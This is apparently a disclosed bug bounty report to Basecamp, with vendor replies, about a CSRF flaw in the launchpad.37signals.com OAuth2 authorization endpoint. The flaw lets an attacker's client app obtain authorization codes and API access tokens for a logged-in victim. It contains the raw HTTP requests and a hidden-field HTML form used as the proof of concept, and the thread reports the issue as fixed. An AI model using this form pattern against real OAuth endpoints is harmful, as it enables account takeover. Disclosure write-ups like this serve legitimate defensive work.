title: CSRF on launchpad.37signals.com OAuth2 authorization endpoint

profile.name: Basecamp
profile.about: Basecamp is the leading online project manager and the birthplace of Ruby on Rails.

vulnerability_information:
Hi,
I found a CSRF in the OAuth2 authorization endpoint on launchpad.37signals.com. That allows a malicious 3rd party application to gain full API access to  victim's  account in 37signals products  that uses OAuth2 authorization.

I found that when making a post request to ``` authorization ```  endpoint it does not check the "authenticity token" if you add " .json or .xml " like this "authorization.json" .

##post request:
```
POST /authorization.json HTTP/1.1
Host: launchpad.37signals.com
Connection: close
Content-Length: 168
Cache-Control: max-age=0
Origin: null
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Safari/537.36
Sec-Fetch-Dest: document
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: _beanstalk_uuid=

client_id={your-client-id}&type=web_server&redirect_uri={your-redirect-uri}&commit=

```


After a 3rd party application gets the authorization code from redirect_uri, it can then exchange it for an access token. and get full access to the api.

## request to get the access token:

```
POST /authorization/token HTTP/1.1
Host: launchpad.37signals.com
Connection: close
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Safari/537.36
Sec-Fetch-Dest: document
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: _beanstalk_uuid=
Content-Type: application/x-www-form-urlencoded
Content-Length: 214

type=web_server&client_id={your-client-id}&redirect_uri={your-redirect-uri}&client_secret={your-client-secret}&code={authorization-code}

```

## PoC:

1- you will need to register on the 37Signals Integration Portal.

2- Login to any 37Signals apps that uses the OAuth2 authorization for example basecamp 3 account. (i tested it using basecamp 3 )

3- for testing , submit the following form through the browser in which you are logged in:

```
<form action="https://launchpad.37signals.com/authorization.json" method="POST">
      <input type="hidden" name="client_id" value="{your-client-id}" />
      <input type="hidden" name="client_secret" value="" />
      <input type="hidden" name="type" value="web_server" />
      <input type="hidden" name="redirect_uri" value="{your-redirect-uri}" />
      <input type="hidden" name="commit" value="" />
      <input type="submit" value="Submit request" />
    </form>
```

you will get the {authorization-code} so you can exchange it for an access token

## Note that a real attack does not require user interaction.

## Impact

Through this vulnerability an attacker can do malicious actions on the victim's account
full API access to  victim's  account
vulnerability_information_html:
Hi,
I found a CSRF in the OAuth2 authorization endpoint on launchpad.37signals.com. That allows a malicious 3rd party application to gain full API access to victim's account in 37signals products that uses OAuth2 authorization.

I found that when making a post request to authorization endpoint it does not check the "authenticity token" if you add " .json or .xml " like this "authorization.json" .

post request:

POST /authorization.json HTTP/1.1
Host: launchpad.37signals.com
Connection: close
Content-Length: 168
Cache-Control: max-age=0
Origin: null
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Safari/537.36
Sec-Fetch-Dest: document
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: _beanstalk_uuid=

client_id={your-client-id}&type=web_server&redirect_uri={your-redirect-uri}&commit=

After a 3rd party application gets the authorization code from redirect_uri, it can then exchange it for an access token. and get full access to the api.

request to get the access token:

POST /authorization/token HTTP/1.1
Host: launchpad.37signals.com
Connection: close
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Safari/537.36
Sec-Fetch-Dest: document
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: _beanstalk_uuid=
Content-Type: application/x-www-form-urlencoded
Content-Length: 214

type=web_server&client_id={your-client-id}&redirect_uri={your-redirect-uri}&client_secret={your-client-secret}&code={authorization-code}

PoC:

1- you will need to register on the 37Signals Integration Portal.

2- Login to any 37Signals apps that uses the OAuth2 authorization for example basecamp 3 account. (i tested it using basecamp 3 )

3- for testing , submit the following form through the browser in which you are logged in:

<form action="https://launchpad.37signals.com/authorization.json" method="POST">
      <input type="hidden" name="client_id" value="{your-client-id}" />
      <input type="hidden" name="client_secret" value="" />
      <input type="hidden" name="type" value="web_server" />
      <input type="hidden" name="redirect_uri" value="{your-redirect-uri}" />
      <input type="hidden" name="commit" value="" />
      <input type="submit" value="Submit request" />
    </form>

you will get the {authorization-code} so you can exchange it for an access token

Note that a real attack does not require user interaction.

Impact

Through this vulnerability an attacker can do malicious actions on the victim's account
full API access to victim's account

activities.message:
Thanks for investigating & reporting, @carbon61.

This is an error, but uncertain to what extent it's a vulnerability—or exploitable.

> After a 3rd party application gets the authorization code from redirect_uri

Are you suggesting that the redirect_uri is hijacked to another URL?
activities.markdown_message:
Thanks for investigating & reporting, @carbon61.

This is an error, but uncertain to what extent it's a vulnerability—or exploitable.

After a 3rd party application gets the authorization code from redirect_uri

Are you suggesting that the redirect_uri is hijacked to another URL?

activities.message: i meant the attacker could create a fake client app on "https://launchpad.37signals.com/integrations/" with his own redirect_uri and use it in the csrf
activities.markdown_message: i meant the attacker could create a fake client app on "https://launchpad.37signals.com/integrations/" with his own redirect_uri and use it in the csrf

activities.message: i will check it again and try to generate another Poc if you could not  reproduce it
activities.markdown_message: i will check it again and try to generate another Poc if you could not reproduce it

activities.message: i'm sorry maybe i reported this one too fast  , i will investigate more and let you know
activities.markdown_message: i'm sorry maybe i reported this one too fast , i will investigate more and let you know

activities.message: i just tested it with  different accounts in basecamphq.com and 3.basecamp.com and i can get the authorization code from my redirect_uri using the csrf form and i was able to exchange it for an access token
activities.markdown_message: i just tested it with different accounts in basecamphq.com and 3.basecamp.com and i can get the authorization code from my redirect_uri using the csrf form and i was able to exchange it for an access token

activities.message:
> i can get the authorization code from my redirect_uri using the csrf form and i was able to exchange it for an access token

Ah, indeed. Confirming CSRF against the authorization page, allowing an attacker to gain access to an account.

We'll put together a fix and verify with you shortly. Thanks @carbon61.
activities.markdown_message:
i can get the authorization code from my redirect_uri using the csrf form and i was able to exchange it for an access token

Ah, indeed. Confirming CSRF against the authorization page, allowing an attacker to gain access to an account.

We'll put together a fix and verify with you shortly. Thanks @carbon61.

activities.message:
Hi @carbon61, sorry for the delay! We'll award a bounty later today, still discussing the amount between the team. We'll be also deploying a fix shortly. 

Thank you again, this was another great find.
activities.markdown_message:
Hi @carbon61, sorry for the delay! We'll award a bounty later today, still discussing the amount between the team. We'll be also deploying a fix shortly.

Thank you again, this was another great find.

activities.message:
Hi again @carbon61! We've just sent a bounty and also deployed a fix for this issue. Would you mind verifying whether you can still reproduce it? 

Thank you!
activities.markdown_message:
Hi again @carbon61! We've just sent a bounty and also deployed a fix for this issue. Would you mind verifying whether you can still reproduce it?

Thank you!

activities.message: the fix looks good, and thank you very much for the bounty.
